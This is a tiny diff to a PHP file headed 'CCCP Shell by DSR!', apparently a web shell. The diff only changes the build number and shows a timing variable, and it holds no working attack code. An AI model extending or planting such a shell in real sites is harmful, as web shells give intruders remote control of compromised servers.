@@ -1,7 +1,7 @@
 <?php
 /*
  * CCCP Shell by DSR!
- * Version: 1.0 Build: 30052012
+ * Version: 1.0 Build: 04062012
  */
 
 $tiempoCarga = microtime(true);
